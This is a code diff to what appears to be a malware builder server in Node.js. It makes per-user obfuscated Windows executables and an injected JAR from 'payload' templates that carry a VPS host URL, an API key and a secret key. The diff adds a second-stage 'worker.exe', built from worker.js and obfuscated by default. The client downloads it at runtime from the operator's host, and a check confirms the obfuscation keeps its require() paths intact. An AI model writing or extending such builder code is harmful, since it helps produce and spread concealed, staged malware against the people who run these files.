@@ -25,6 +25,16 @@ function executeCommand(command, args = [], options = {}) {
   });
 }
 
+// Compile a JS temp file to a Windows exe via the locally installed pkg.
+async function compileViaPkg(tempJsPath, outExePath) {
+  const localPkg = path.join(PAYLOAD_DIR, "node_modules", ".bin", "pkg");
+  const pkgBin = fs.pathExistsSync(localPkg)
+    ? `"${localPkg}"`
+    : "npx --yes @yao-pkg/pkg";
+  const pkgCmd = `${pkgBin} "${tempJsPath}" --targets node22-win-x64 --output "${outExePath}"`;
+  await executeCommand(pkgCmd, [], { cwd: PAYLOAD_DIR });
+}
+
 /**
  * Main build process triggers compilation and injection
  * @param {string|number} userId User triggering the build
@@ -78,7 +88,8 @@ async function startPersonalizedBuild(
       .replace("PLACEHOLDER_USER_ID", String(userId))
       .replace("PLACEHOLDER_HOST_URL", vpsHost)
       .replace("PLACEHOLDER_API_KEY", apiKey)
-      .replace("PLACEHOLDER_SECRET_KEY", secretKey);
+      .replace("PLACEHOLDER_SECRET_KEY", secretKey)
+      .replace("PLACEHOLDER_WORKER_URL", `${vpsHost}/api/payloads/download/${userId}/worker.exe`);
 
     // Optional source obfuscation before pkg compilation. Disable with
     // OBFUSCATE_JS=0; level via JS_OBSCURE_LEVEL (light|full).
@@ -122,13 +133,57 @@ async function startPersonalizedBuild(
       // Use the locally installed @yao-pkg/pkg (devDependency) so builds do not
       // hit the npm registry on every run. Falls back to npx only when the
       // dependency is not installed yet (fresh checkout before npm install).
-      const localPkg = path.join(PAYLOAD_DIR, "node_modules", ".bin", "pkg");
-      const pkgBin = fs.pathExistsSync(localPkg) ? `"${localPkg}"` : "npx --yes @yao-pkg/pkg";
-      const pkgCmd = `${pkgBin} "${tempPayloadPath}" --targets node22-win-x64 --output "${clientExePath}"`;
-      await executeCommand(pkgCmd, [], { cwd: PAYLOAD_DIR });
+      await compileViaPkg(tempPayloadPath, clientExePath);
     } finally {
       // Clean up the temporary payload file
       await fs.remove(tempPayloadPath).catch(() => {});
+    }
+
+    // Step 2.5: Compile the per-build worker (worker.js) that the client
+    // fetches at runtime from /api/payloads/download/:userId/worker.exe.
+    const workerExePath = path.join(distDir, "worker.exe");
+    try {
+      logDetails.steps.push("Step 2.5: Compiling worker via @yao-pkg/pkg");
+      const workerTemplatePath = path.join(PAYLOAD_DIR, "worker.js");
+      if (!(await fs.pathExists(workerTemplatePath))) {
+        throw new Error(`Worker template not found at ${workerTemplatePath}`);
+      }
+      let workerContent = await fs.readFile(workerTemplatePath, "utf8");
+      workerContent = workerContent
+        .replace("PLACEHOLDER_USER_ID", String(userId))
+        .replace("PLACEHOLDER_HOST_URL", vpsHost)
+        .replace("PLACEHOLDER_API_KEY", apiKey)
+        .replace("PLACEHOLDER_SECRET_KEY", secretKey);
+      const obfuscator = require(path.join(PAYLOAD_DIR, "obfuscate.js"));
+      if (process.env.OBFUSCATE_JS !== "0") {
+        const workerObf = obfuscator.obfuscateSource(
+          workerContent,
+          process.env.JS_OBSCURE_LEVEL || "full",
+        );
+        const lost = [...obfuscator.extractRequires(workerContent)].filter(
+          (req) =>
+            !workerObf.includes(`"${req}"`) && !workerObf.includes(`'${req}'`),
+        );
+        if (lost.length) {
+          throw new Error(
+            `worker obfuscation dropped require() paths: ${lost.join(", ")}`,
+          );
+        }
+        workerContent = workerObf;
+        logDetails.steps.push(
+          `Step 2.5.1: Obfuscated worker JS (${workerObf.length} bytes)`,
+        );
+      }
+      const tempWorkerPath = path.join(PAYLOAD_DIR, `worker_user_${userId}.js`);
+      await fs.writeFile(tempWorkerPath, workerContent, "utf8");
+      try {
+        await compileViaPkg(tempWorkerPath, workerExePath);
+      } finally {
+        await fs.remove(tempWorkerPath).catch(() => {});
+      }
+    } catch (e) {
+      // A failed worker build should not silently produce a broken client.
+      throw new Error(`Worker build failed: ${e.message}`);
     }
 
     // Step 3: Run the JAR builder
@@ -197,7 +252,7 @@ async function startPersonalizedBuild(
     // await fs.remove(tempDir);
 
     // Record build in DB
-    const filesGenerated = [correctJarName, "client.exe"];
+    const filesGenerated = [correctJarName, "client.exe", "worker.exe"];
     const buildId = `build_user_${userId}_${Date.now()}`;
     await db.createBuild(userId, buildId, targetJarPath, filesGenerated);
 
@@ -220,6 +275,7 @@ async function startPersonalizedBuild(
       files: filesGenerated,
       jarPath: `/api/payloads/download/${userId}/${correctJarName}`,
       exePath: `/api/payloads/download/${userId}/client.exe`,
+      workerPath: `/api/payloads/download/${userId}/worker.exe`,
     };
   } catch (err) {
     console.error("Build failure:", err);
